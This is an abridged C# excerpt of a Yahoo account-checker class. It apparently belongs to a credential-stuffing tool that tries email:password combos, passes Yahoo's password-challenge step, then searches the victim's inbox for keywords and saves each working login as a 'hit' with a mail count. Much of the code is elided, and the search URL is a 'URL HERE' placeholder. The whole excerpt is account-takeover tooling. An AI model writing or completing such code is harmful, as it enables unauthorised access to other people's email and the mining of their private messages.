    ...
    class Yahoo2
    {
        ...
        public static bool check(string combo)
        {
            ...
            try
            {
                ...
                string str1 = Yahoo2.RandomDigits(12);
                ...
                else if (str5.Contains("location\":\"/account/challenge/password"))
                {
                    ...
                    if (str8.Contains("SUCESS KEY"))
                    {
                        ...
                        httpRequest.AddHeader("Accept", "*/*");
                        string str9 = httpRequest.Get("https://mail.yahoo.com/").ToString();
                        string wsid = Cryptography.LR(str9, "mailWssid\":\"", "\",").FirstOrDefault();
                        while (!Program.keyword.IsEmpty)
                        {
                            string kw;
                            Program.keyword.TryDequeue(out kw);
                            httpRequest.ClearAllHeaders();
                            httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                            httpRequest.AddHeader("Accept", "*/*");
                            string str10 = httpRequest.Get("URL HERE" + kw + "&appid=YMailNorrin&wssid=" + wsid).ToString();
                            thit = Cryptography.LR(str10, "totalHits\":", ",\"").FirstOrDefault();
                        }
                        ...
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine("[+]" + combo + $" | MailsFoundInbox: {thit}", Color.Green);
                        }
                        Program.Save(combo + $" | MailsFoundInbox: {thit}", "Yahoo Hits");
                        return true;
                    }
                    else if (num)
                    {
